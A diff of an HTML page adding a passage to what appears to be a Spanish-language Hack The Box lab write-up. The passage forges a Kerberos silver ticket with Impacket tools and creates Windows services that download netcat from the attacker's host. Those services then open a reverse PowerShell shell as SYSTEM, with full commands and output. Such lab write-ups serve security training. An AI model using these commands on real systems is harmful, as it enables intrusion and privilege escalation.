@@ -556,7 +556,109 @@ RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is un
 </span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="ve">[+] </span><span class="p">htb.local\DEV$:01300a3009c7ae1af0ea216ebada48ad</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para conseguir una sesion en <code class="language-plaintext highlighter-rouge">DEV$</code> podemos usar <code class="language-plaintext highlighter-rouge">Rubeus</code> sin embargo solo funciona en <code class="language-plaintext highlighter-rouge">windows</code> asi que iniciamos definiendo con <code class="language-plaintext highlighter-rouge">iptables</code> que todo el trafico que recibamos hacia la red <code class="language-plaintext highlighter-rouge">192.168.3.0/24</code> lo redirijamos hacia el puerto <code class="language-plaintext highlighter-rouge">12345</code></p>
+<p class="plain-text">Sin embargo no nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code>, ahora vamos mediante un <code class="language-plaintext highlighter-rouge">silver ticket</code> suplantar a <code class="language-plaintext highlighter-rouge">Administrator</code>, para ello antes necesitamos obtener el <code class="language-plaintext highlighter-rouge">SID</code> del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-getPac htb.local/bob:Passw0rd1! -targetUser bob | </span><span class="ve">grep </span><span class="p">SID  
+Domain </span><span class="ro">SID</span><span class="p">: S-1-5-21-4266912945-3985045794-2943778634</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con el <code class="language-plaintext highlighter-rouge">SID</code> y el <code class="language-plaintext highlighter-rouge">hash</code> crearemos un nuevo ticket con <code class="language-plaintext highlighter-rouge">ticketer</code> para el spn <code class="language-plaintext highlighter-rouge">cifs</code> de dev suplantando a <code class="language-plaintext highlighter-rouge">Administrator</code>, lo exportamos para autenticarnos con el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-ticketer </span><span class="p">-nthash 01300a3009c7ae1af0ea216ebada48ad -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain htb.local -spn cifs/dev.htb.local Administrator  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for htb.local/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> comprobamos la autenticación con el <code class="language-plaintext highlighter-rouge">ticket</code> y nos devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> sin embargo no tenemos privilegios de escritura en recursos <code class="language-plaintext highlighter-rouge">SMB</code> por lo que no podremos conseguir una shell utilizando herramientas como <code class="language-plaintext highlighter-rouge">psexec</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dev.htb.local -k --use-kcache
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="ve">[+] </span><span class="p">htb.local\ from ccache </span><span class="am">(Pwn3d!)
+
+</span><span class="ve">❯ proxychains</span><span class="p"> -q crackmapexec smb dev.htb.local -k --use-kcache --shares
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="az">[*] </span><span class="p">Windows Server 2019 Standard 17763 x64 (name:DEV) (domain:htb.local) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="ve">[+] </span><span class="p">htb.local\ from ccache </span><span class="am">(Pwn3d!)
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">dev.htb.local   445    DEV              </span><span class="am">IPC$                            Remote IPC</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si intentamos dumpear la <code class="language-plaintext highlighter-rouge">sam</code> con <code class="language-plaintext highlighter-rouge">secretsdump</code> nos devuelve un pequeño error</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-secretsdump dev.htb.local -k -no-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xe4b2298c95677ce18cd2198b9a36c7df
+[-] SAM hashes extraction failed: SMB SessionError: STATUS_BAD_NETWORK_NAME({Network Name Not Found} The specified share name cannot be found on the remote server.)  
+[-] LSA hashes extraction failed: SMB SessionError: STATUS_BAD_NETWORK_NAME({Network Name Not Found} The specified share name cannot be found on the remote server.)  
+[*] Cleaning up...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos hacer uso de <code class="language-plaintext highlighter-rouge">services</code> para crear un nuevo servicio llamado <code class="language-plaintext highlighter-rouge">netcat</code> el cual ejecutara un <code class="language-plaintext highlighter-rouge">curl</code> a nuestro host para descargar el <code class="language-plaintext highlighter-rouge">netcat.exe</code> en la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-services dev.htb.local -k -no-pass -dc-ip dc1.htb.local create -name netcat -display netcat -path </span><span class="am">'curl 10.10.14.10/netcat.exe -o C:\ProgramData\netcat.exe'  </span><span class="p">
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating service netcat</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usamos la funcion <code class="language-plaintext highlighter-rouge">start</code> para correr el servicio <code class="language-plaintext highlighter-rouge">netcat</code> que creamos antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-services dev.htb.local -k -no-pass -dc-ip dc1.htb.local start -name netcat  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Starting service netcat</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al hacerlo recibimos una petición del <code class="language-plaintext highlighter-rouge">netcat.exe</code> en nuestra maquina lo que quiere decir que se descargo el netcat y que ejecutamos <code class="language-plaintext highlighter-rouge">comandos</code> en la maquina dev</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
+10.13.38.17 - - "GET /netcat.exe HTTP/1.1" 200 -</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora creamos un <code class="language-plaintext highlighter-rouge">servicio</code> llamado shell el cual ejecute el <code class="language-plaintext highlighter-rouge">netcat.exe</code> para enviarnos una <code class="language-plaintext highlighter-rouge">powershell</code> a nuestro host por el puerto <code class="language-plaintext highlighter-rouge">443</code>, despues lo corremos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q impacket-services dev.htb.local -k -no-pass -dc-ip dc1.htb.local create -name shell -display shell -path </span><span class="am">'C:\ProgramData\netcat.exe 10.10.14.10 443 -e powershell'  </span><span class="p">
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating service shell
+
+</span><span class="ve">❯ proxychains</span><span class="p"> -q impacket-services dev.htb.local -k -no-pass -dc-ip dc1.htb.local start -name shell   
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Starting service shell</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al correr el servicio recibimos una <code class="language-plaintext highlighter-rouge">powershell</code> en la máquina <code class="language-plaintext highlighter-rouge">DEV</code> como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el que tiene maximos privilegios sobre el sistema</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.13.38.17
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra forma de conseguir una sesion en <code class="language-plaintext highlighter-rouge">DEV$</code> es usar <code class="language-plaintext highlighter-rouge">Rubeus</code> sin embargo solo funciona en <code class="language-plaintext highlighter-rouge">windows</code> asi que iniciamos definiendo con <code class="language-plaintext highlighter-rouge">iptables</code> que todo el trafico que recibamos hacia la red <code class="language-plaintext highlighter-rouge">192.168.3.0/24</code> lo redirijamos hacia el puerto <code class="language-plaintext highlighter-rouge">12345</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo iptables</span><span class="p"> -t nat -A OUTPUT -p tcp -d 192.168.3.0/24 -j REDIRECT --to-port 12345
 </span><span class="ve">❯ sudo iptables</span><span class="p"> -t nat -A PREROUTING -p tcp -d 192.168.3.0/24 -j REDIRECT --to-port 12345  </span>
